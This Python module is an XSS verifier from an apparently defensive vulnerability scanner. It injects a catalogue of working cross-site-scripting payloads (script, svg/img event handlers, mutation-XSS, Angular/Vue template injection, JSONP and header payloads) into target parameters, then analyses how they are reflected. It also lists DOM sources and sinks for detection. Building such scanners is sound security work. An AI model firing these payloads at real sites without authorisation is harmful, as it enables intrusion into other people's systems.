"""
XSS Verifier: Active verification for Reflected, Stored, DOM-based,
JSONP, header-reflected, and mXSS vulnerabilities.

Improvements over the original
--------------------------------
1.  Randomised per-scan canary  — eliminates cache-collision false results.
2.  O(n) reflection detection   — re.finditer() replaces O(n²) slicing loop.
3.  Attribute context fix        — href/src/action attributes correctly
                                   flagged as executable for javascript: URIs.
4.  JSONP-specific payload       — tested whenever param name suggests JSONP.
5.  mXSS probe payloads          — exercises browser re-parsing edge-cases.
6.  Template-injection payloads  — Vue/Angular expression contexts.
7.  Header-injection path        — Referer/User-Agent/X-Forwarded-For etc.
8.  Expanded DOM sink/source set — setTimeout, setInterval, jQuery sinks,
                                   navigation sinks, localStorage/postMessage.
9.  Stored XSS candidate URLs    — caller can pass ``stored_display_urls``
                                   in kwargs so the verifier checks the real
                                   pages where stored data is rendered.
"""

import asyncio
import html
import logging
import random
import re
import string
from typing import Optional

from app.core.detectors.base_detector import Finding
from app.core.verification.response_analyzer import ResponseAnalyzer, ResponseData
from app.core.verification.verification_framework import (
    BaseVerifier,
    FormPayloadBuilder,
    URLParameterBuilder,
    VerificationResult,
)
from app.models.vulnerability import OwaspCategory, SeverityLevel

logger = logging.getLogger(__name__)


def _random_canary(prefix: str = "sentry", length: int = 8) -> str:
    """Return a short, unpredictable canary string safe to embed in HTML."""
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{prefix}_{suffix}"


def _embed_canary(payload: str, canary: str) -> str:
    """Embed a per-request canary so reflection can be attributed unambiguously."""
    if "alert(1)" in payload:
        return payload.replace("alert(1)", f"alert('{canary}')", 1)
    if "alert(1);//" in payload:
        return payload.replace("alert(1);//", f"alert('{canary}');//", 1)
    return f"{payload}<!--{canary}-->"


class XSSVerifier(BaseVerifier):
    """Verifies Reflected, Stored, DOM-based, header-reflected, JSONP,
    mXSS and template-injection XSS vulnerabilities through active testing."""

    module_name = "xss"

    # ------------------------------------------------------------------ #
    # Payload catalogue
    # ------------------------------------------------------------------ #

    # Core reflected/stored payloads — used for every candidate.
    XSS_PAYLOADS: dict[str, str] = {
        "simple":    "<script>alert(1)</script>",
        "event":     '"><svg/onload=alert(1)>',
        "attribute": "'><img src=x onerror=alert(1)>",
        "jsdouble":  '"alert(1)"',
        "jssingle":  "'alert(1)'",
        "js_noangle": "javascript:alert(1)",
        "polyglot":  "'\"><script>alert(1)</script>",
        # mXSS — exercises browser re-parsing after sanitiser
        "mxss_listing": "<listing><img src=</listing><img src=x onerror=alert(1)>",
        "mxss_noscript": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        # Template injection (Vue / Angular expression contexts)
        "tmpl_angular": "{{constructor.constructor('alert(1)')()}}",
        "tmpl_vue":     "{{_c.constructor('alert(1)')()}}",
    }

    # JSONP-specific payloads.  Only used when the parameter name looks like
    # a JSONP callback (callback, jsonp, cb, …).
    JSONP_PAYLOADS: dict[str, str] = {
        "jsonp_basic":    "alert(1)//",
        "jsonp_paren":    "alert(1);",
        "jsonp_proto":    "Object.prototype.toString.call(alert(1))//",
    }

    # Header-injection payloads.  Only used for HEADER: method candidates.
    # We inject into the named header; if the value is reflected unencoded
    # into the response body it is an XSS surface.
    HEADER_PAYLOADS: dict[str, str] = {
        "hdr_script":  "<script>alert(1)</script>",
        "hdr_svg":     "<svg/onload=alert(1)>",
        "hdr_img":     "<img src=x onerror=alert(1)>",
    }

    # Parameter names that indicate a JSONP endpoint.
    _JSONP_PARAM_NAMES: frozenset[str] = frozenset(
        {"callback", "jsonp", "cb", "json_callback", "jsoncallback"}
    )

    # href/src/action — javascript: URIs are executable here even though the
    # surrounding context is an HTML attribute.
    _EXECUTABLE_ATTR_NAMES: frozenset[str] = frozenset(
        {"href", "src", "action", "formaction", "data", "xlink:href"}
    )

    # ------------------------------------------------------------------ #
    # Context detection regexes
    # ------------------------------------------------------------------ #

    SCRIPT_TAG_CONTEXT     = re.compile(r"<script[^>]*>", re.IGNORECASE)
    EVENT_HANDLER_CONTEXT  = re.compile(r"\s+on\w+=", re.IGNORECASE)
    HTML_ATTRIBUTE_CONTEXT = re.compile(r'\s+(?P<attr>\w[\w:-]*)=["\'`]', re.IGNORECASE)
    JS_STRING_CONTEXT      = re.compile(r'["\'`]\s*$', re.IGNORECASE)

    # ------------------------------------------------------------------ #
    # DOM source / sink regexes  (expanded)
    # ------------------------------------------------------------------ #

    _DOM_SOURCES: tuple[str, ...] = (
        r"location\.hash",
        r"location\.search",
        r"location\.href",
        r"document\.URL",
        r"document\.documentURI",
        r"document\.referrer",
        r"window\.location",
        r"document\.cookie",
        r"localStorage\.",
        r"sessionStorage\.",
        r"window\.name",
        # postMessage source
        r"addEventListener\(['\"]message['\"]",
    )

    _DOM_SINKS: tuple[str, ...] = (
        r"eval\(",
        r"document\.write\(",
        r"document\.writeln\(",
        r"\.innerHTML\s*=",
        r"\.outerHTML\s*=",
        r"\.insertAdjacentHTML\(",
        r"setTimeout\(",
        r"setInterval\(",
        r"new\s+Function\(",
        # jQuery sinks
        r"\$\s*\(",
        r"\.html\s*\(",
        r"\.append\s*\(",
        r"\.prepend\s*\(",
        r"\.after\s*\(",
        r"\.before\s*\(",
        # Navigation sinks (open-redirect → XSS)
        r"location\.assign\s*\(",
        r"location\.replace\s*\(",
        r"location\.href\s*=",
    )

    # ------------------------------------------------------------------ #
    # Public interface
    # ------------------------------------------------------------------ #

    async def verify(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
        value: str = "",
        form_inputs: Optional[list] = None,
        stored_display_urls: Optional[list[str]] = None,
    ) -> VerificationResult:
        """
        Verify XSS vulnerability.

        Parameters
        ----------
        url                 : Target URL.
        parameter           : Parameter (or header name) to inject.
        method              : HTTP method.  Pass ``"HEADER:<name>"`` for
                              header-injection candidates.
        value               : Existing parameter value (used as baseline).
        form_inputs         : Raw form inputs for POST candidates.
        stored_display_urls : Extra URLs to probe for stored-XSS reflection
                              (e.g. admin panel, profile page, feed page).
        """
        self._begin_verification(parameter)
        findings: list[Finding] = []

        is_header_injection = method.upper().startswith("HEADER:")
        is_jsonp = parameter.lower() in self._JSONP_PARAM_NAMES

        pre_test_baseline = await self.fetch_pre_test_baseline(
            url, parameter, method, value, form_inputs
        )

        # DOM XSS — uses the clean pre-test snapshot; not for header candidates.
        if not is_header_injection:
            try:
                dom_finding = self._check_dom_xss(url, pre_test_baseline.body)
                if dom_finding:
                    findings.append(dom_finding)
            except Exception as e:
                logger.debug("Failed to perform DOM XSS check: %s", e)

        # ---------------------------------------------------------------- #
        # Canary check — skip active payloads if the param isn't reflected.
        # Use a fresh random canary each scan to avoid cache collisions.
        # ---------------------------------------------------------------- #
        if not is_header_injection:
            canary = ResponseAnalyzer.generate_probe_canary()
            canary_payload = canary
            try:
                if method.upper() == "POST" and form_inputs is not None:
                    canary_url    = url
                    canary_params = None
                    canary_data   = self._build_form_payload(form_inputs, parameter, canary_payload)
                else:
                    canary_url, canary_params, canary_data = (
                        URLParameterBuilder.inject_parameter(url, parameter, canary_payload, method)
                    )

                canary_resp = await self._send(
                    canary_url, method, canary_params, canary_data,
                    test_phase="canary", payload=canary_payload,
                )

                is_canary_reflected, reflection_evidence = ResponseAnalyzer.verify_reflection(
                    canary_payload,
                    canary_resp.body,
                    baseline_body=pre_test_baseline.body,
                    canary=canary,
                )

                if not is_canary_reflected or method.upper() == "POST":
                    reflected_in_stored = await self._check_stored_reflection(
                        canary_payload, url, stored_display_urls, canary=canary
                    )
                    if reflected_in_stored:
                        is_canary_reflected = True

                if not is_canary_reflected:
                    return VerificationResult(
                        is_vulnerable=False,
                        confidence_score=0.0,
                        detection_method="canary_check",
                        findings=[],
                        evidence={
                            "reflected": False,
                            "reason": reflection_evidence.get("reason", "Canary payload not reflected"),
                        },
                    )
            except Exception as e:
                logger.debug("Failed to perform canary reflection check: %s", e)

        # ---------------------------------------------------------------- #
        # Active payload testing
        # ---------------------------------------------------------------- #
        payload_set: dict[str, str]
        if is_header_injection:
            payload_set = self.HEADER_PAYLOADS
        elif is_jsonp:
            payload_set = {**self.XSS_PAYLOADS, **self.JSONP_PAYLOADS}
        else:
            payload_set = self.XSS_PAYLOADS

        for payload_type, payload in payload_set.items():
            result = await self._test_payload(
                url, parameter, method, value, payload, payload_type,
                form_inputs, stored_display_urls, pre_test_baseline,
            )
            if result.is_vulnerable:
                findings.extend(result.findings)

        if findings:
            findings.sort(key=lambda f: f.confidence_score, reverse=True)
            best = findings[0]
            return VerificationResult(
                is_vulnerable=True,
                confidence_score=best.confidence_score,
                detection_method=best.detection_method,
                findings=findings,
                evidence={"payload_type": best.detection_method},
                reproducible=True,
            )

        return VerificationResult(
            is_vulnerable=False,
            confidence_score=0.0,
            detection_method="none",
            findings=[],
            evidence={},
        )

    # ------------------------------------------------------------------ #
    # DOM XSS heuristics  (expanded sink / source set)
    # ------------------------------------------------------------------ #

    def _check_dom_xss(self, url: str, html_body: str) -> Optional[Finding]:
        """Perform static analysis of HTML/JS for DOM-based XSS indicators."""
        found_sources = [
            src for src in self._DOM_SOURCES
            if re.search(src, html_body, re.I)
        ]
        found_sinks = [
            sink for sink in self._DOM_SINKS
            if re.search(sink, html_body, re.I)
        ]

        if found_sources and found_sinks:
            evidence = (
                f"Page source contains potential DOM XSS sources {found_sources} "
                f"and sinks {found_sinks}. Client-side JavaScript may dynamically "
                "render unvalidated input."
            )
            return self._create_finding(
                category=OwaspCategory.a05,
                vuln_type="DOM-Based XSS",
                severity=SeverityLevel.medium,
                url=url,
                parameter="javascript",
                payload="location.hash",
                evidence=evidence,
                confidence_score=60.0,
                detection_method="dom_xss_heuristics",
                method="GET",
                detection_evidence={
                    "found_sources": found_sources,
                    "found_sinks": found_sinks,
                },
                reproducible=True,
                verified=False,
            )
        return None

    # ------------------------------------------------------------------ #
    # Payload testing
    # ------------------------------------------------------------------ #

    async def _test_payload(
        self,
        url: str,
        parameter: str,
        method: str,
        value: str,
        payload: str,
        payload_type: str,
        form_inputs: Optional[list],
        stored_display_urls: Optional[list[str]],
        pre_test_baseline: ResponseData,
    ) -> VerificationResult:
        """Test a single XSS payload for reflection (immediate and stored)."""
        try:
            is_header = method.upper().startswith("HEADER:")
            canary = ResponseAnalyzer.generate_probe_canary()
            injected_payload = _embed_canary(payload, canary)

            if is_header:
                header_name = method.split(":", 1)[1]
                injected = await self._send(
                    url, "GET", None, None,
                    headers={header_name: injected_payload},
                    test_phase=f"payload_{payload_type}",
                    payload=injected_payload,
                )
            elif method.upper() == "POST" and form_inputs is not None:
                injected_url    = url
                injected_params = None
                injected_data   = self._build_form_payload(
                    form_inputs, parameter, injected_payload
                )
                injected = await self._send(
                    injected_url, method, injected_params, injected_data,
                    test_phase=f"payload_{payload_type}", payload=injected_payload,
                )
            else:
                injected_url, injected_params, injected_data = (
                    URLParameterBuilder.inject_parameter(
                        url, parameter, injected_payload, method
                    )
                )
                injected = await self._send(
                    injected_url, method, injected_params, injected_data,
                    test_phase=f"payload_{payload_type}", payload=injected_payload,
                )

            is_reflected, locations, was_encoded = self._detect_reflection(
                injected_payload, injected.body
            )
            is_stored = False
            reflection_evidence: dict = {}

            if is_reflected and (is_header or method.upper() != "POST"):
                is_reflected, reflection_evidence = ResponseAnalyzer.verify_reflection(
                    injected_payload,
                    injected.body,
                    baseline_body=pre_test_baseline.body,
                    canary=canary,
                )

            if not is_reflected or method.upper() == "POST":
                await asyncio.sleep(0.2)
                stored_reflected, stored_locations, stored_was_encoded, stored_resp, stored_evidence = (
                    await self._probe_stored(
                        injected_payload, url, stored_display_urls, canary=canary
                    )
                )
                if stored_reflected:
                    is_reflected  = True
                    locations     = stored_locations
                    was_encoded   = stored_was_encoded
                    injected      = stored_resp
                    is_stored     = True
                    reflection_evidence = stored_evidence

            if not is_reflected:
                return VerificationResult(
                    is_vulnerable=False,
                    confidence_score=0.0,
                    detection_method=payload_type,
                    findings=[],
                    evidence={
                        "reflected": False,
                        "reason": reflection_evidence.get("reason", "no_reflection"),
                    },
                )

            body_for_analysis = html.unescape(injected.body) if was_encoded else injected.body
            context_analysis  = self._analyze_reflection_context(
                body_for_analysis, injected_payload, locations
            )
            context_analysis["verification_canary"] = canary
            context_analysis["canary_verified"] = bool(
                reflection_evidence.get("canary_verified")
            )

            if was_encoded:
                context_analysis["encoding_type"]  = "html_encoded"
                context_analysis["is_executable"]  = False

            confidence_score = self._calculate_xss_confidence(payload, context_analysis)
            severity         = self._determine_xss_severity(context_analysis)

            vuln_type = (
                "Stored XSS"            if is_stored
                else "Header-Reflected XSS" if method.upper().startswith("HEADER:")
                else "Reflected XSS"
            )

            finding = self._create_finding(
                category=OwaspCategory.a05,
                vuln_type=vuln_type,
                severity=severity,
                url=url,
                parameter=parameter,
                payload=injected_payload,
                evidence=(
                    f"Payload {'stored and ' if is_stored else ''}reflected in response. "
                    f"Context: {context_analysis['context_type']}. "
                    f"Encoding: {context_analysis['encoding_type']}."
                ),
                confidence_score=confidence_score,
                detection_method=f"reflection_{payload_type}",
                method=method,
                detection_evidence=context_analysis,
                reproducible=True,
                verified=True,
                verification_request_snippet=injected.request_snippet,
                verification_response_snippet=injected.response_snippet,
            )

            return VerificationResult(
                is_vulnerable=True,
                confidence_score=confidence_score,
                detection_method=f"reflection_{payload_type}",
                findings=[finding],
                evidence=context_analysis,
                reproducible=True,
            )

        except Exception as e:
            logger.error("XSS verification failed for %s:%s: %s", url, parameter, e)
            return VerificationResult(
                is_vulnerable=False,
                confidence_score=0.0,
                detection_method=payload_type,
                findings=[],
                evidence={"error": str(e)},
            )

    # ------------------------------------------------------------------ #
    # Stored XSS helpers
    # ------------------------------------------------------------------ #

    async def _check_stored_reflection(
        self,
        payload: str,
        origin_url: str,
        stored_display_urls: Optional[list[str]],
        *,
        canary: str | None = None,
    ) -> bool:
        """Quick canary check across stored display URLs.  Returns True if any
        of them reflect the payload."""
        is_reflected, _, _, _, _ = await self._probe_stored(
            payload, origin_url, stored_display_urls, canary=canary
        )
        return is_reflected

    async def _probe_stored(
        self,
        payload: str,
        origin_url: str,
        stored_display_urls: Optional[list[str]],
        *,
        canary: str | None = None,
    ) -> tuple[bool, list[int], bool, Optional[object], dict]:
        """
        Check whether ``payload`` appears in any of the stored display URLs.

        Falls back to ``origin_url`` (query-stripped) when no display URLs are
        provided — preserving the original behaviour.

        Returns (is_reflected, locations, was_encoded, response_object, evidence).
        response_object is None when nothing was found.
        """
        urls_to_probe: list[str] = list(stored_display_urls or [])
        bare = origin_url.split("?")[0]
        if bare not in urls_to_probe:
            urls_to_probe.append(bare)

        display_baselines: dict[str, ResponseData] = {}
        for probe_url in urls_to_probe:
            try:
                if probe_url not in display_baselines:
                    display_baselines[probe_url] = await self._send(
                        probe_url, "GET", test_phase="stored_pre_test_baseline"
                    )
                resp = await self._send(probe_url, "GET", test_phase="stored_check")
                is_ref, locs, was_enc = self._detect_reflection(payload, resp.body)
                if not is_ref:
                    continue

                verified, reflection_evidence = ResponseAnalyzer.verify_reflection(
                    payload,
                    resp.body,
                    baseline_body=display_baselines[probe_url].body,
                    canary=canary,
                )
                if verified:
                    reflection_evidence["verification_canary"] = canary
                    return True, locs, was_enc, resp, reflection_evidence
            except Exception as e:
                logger.debug("Stored-XSS probe failed for %s: %s", probe_url, e)

        return False, [], False, None, {}

    # ------------------------------------------------------------------ #
    # Reflection detection — O(n) via re.finditer
    # ------------------------------------------------------------------ #

    @staticmethod
    def _detect_reflection(payload: str, body: str) -> tuple[bool, list[int], bool]:
        """
        Check whether ``payload`` appears in ``body``, trying both raw and
        HTML-decoded forms.

        Returns
        -------
        (is_reflected, locations, was_encoded)
            is_reflected  – True if the payload was found by either method.
            locations     – List of character offsets where the payload starts.
            was_encoded   – True if the match only succeeded after html.unescape().
        """
        escaped = re.escape(payload)

        # 1. Raw match — O(n) via finditer
        raw_locations = [m.start() for m in re.finditer(escaped, body)]
        if raw_locations:
            return True, raw_locations, False

        # 2. HTML-decoded match
        decoded_body      = html.unescape(body)
        decoded_locations = [m.start() for m in re.finditer(escaped, decoded_body)]
        if decoded_locations:
            return True, decoded_locations, True

        return False, [], False

    # ------------------------------------------------------------------ #
    # Context analysis  (attribute executability fix)
    # ------------------------------------------------------------------ #

    def _analyze_reflection_context(
        self,
        response_body: str,
        payload: str,
        locations: list[int],
    ) -> dict:
        """Analyse the context where the payload is reflected."""
        analysis: dict = {
            "context_type":  "unknown",
            "encoding_type": "unencoded",
            "is_executable": False,
            "locations":     locations,
            "attr_name":     None,
        }

        if not locations:
            return analysis

        loc           = locations[0]
        context_start = max(0, loc - 100)
        context_end   = min(len(response_body), loc + len(payload) + 100)
        context       = response_body[context_start:context_end]

        # Encoding check
        if "%" in context or "&#" in context or "&amp;" in context or "\\x" in context:
            analysis["encoding_type"] = "encoded"
        else:
            analysis["encoding_type"] = "unencoded"

        # Context classification — order matters (most specific first)
        if self.SCRIPT_TAG_CONTEXT.search(context):
            analysis["context_type"]  = "script_tag"
            analysis["is_executable"] = analysis["encoding_type"] == "unencoded"

        elif self.EVENT_HANDLER_CONTEXT.search(context):
            analysis["context_type"]  = "event_handler"
            analysis["is_executable"] = analysis["encoding_type"] == "unencoded"

        elif m := self.HTML_ATTRIBUTE_CONTEXT.search(context):
            # FIX: attribute executability depends on *which* attribute.
            # href="javascript:..." / src="javascript:..." etc. are executable.
            attr_name = m.group("attr").lower()
            analysis["context_type"] = "html_attribute"
            analysis["attr_name"]    = attr_name
            is_nav_attr = attr_name in self._EXECUTABLE_ATTR_NAMES
            has_js_uri  = payload.lower().startswith("javascript:")
            analysis["is_executable"] = (
                is_nav_attr
                and has_js_uri
                and analysis["encoding_type"] == "unencoded"
            )

        elif self.JS_STRING_CONTEXT.search(context):
            analysis["context_type"]  = "javascript_string"
            analysis["is_executable"] = analysis["encoding_type"] == "unencoded"

        else:
            analysis["context_type"]  = "html_body"
            analysis["is_executable"] = analysis["encoding_type"] == "unencoded"

        return analysis

    # ------------------------------------------------------------------ #
    # Form payload builder
    # ------------------------------------------------------------------ #

    def _build_form_payload(
        self, form_inputs: list, target_param: str, target_value: str
    ) -> dict:
        """Delegate to shared FormPayloadBuilder."""
        return FormPayloadBuilder.build(form_inputs, target_param, target_value)

    # ------------------------------------------------------------------ #
    # Confidence and severity
    # ------------------------------------------------------------------ #

    @staticmethod
    def _calculate_xss_confidence(payload: str, context: dict) -> float:
        """Calculate XSS confidence score based on payload and reflection context."""
        base_confidence = 60.0

        if context["is_executable"]:
            base_confidence += 25.0
        elif context["encoding_type"] in ("encoded", "html_encoded"):
            base_confidence -= 15.0

        ctx = context["context_type"]
        if ctx == "javascript_string":
            base_confidence += 10.0
        elif ctx == "event_handler":
            base_confidence += 15.0
        elif ctx == "html_attribute" and context.get("attr_name") in (
            "href", "src", "action", "formaction"
        ):
            # javascript: URI in a navigation attribute — escalate confidence
            base_confidence += 12.0

        return min(100.0, max(0.0, base_confidence))

    @staticmethod
    def _determine_xss_severity(context: dict) -> SeverityLevel:
        """Determine severity based on reflection context."""
        if context["is_executable"]:
            if context["context_type"] in ("script_tag", "event_handler"):
                return SeverityLevel.critical
            return SeverityLevel.high
        if context["encoding_type"] in ("encoded", "html_encoded"):
            return SeverityLevel.low
        return SeverityLevel.medium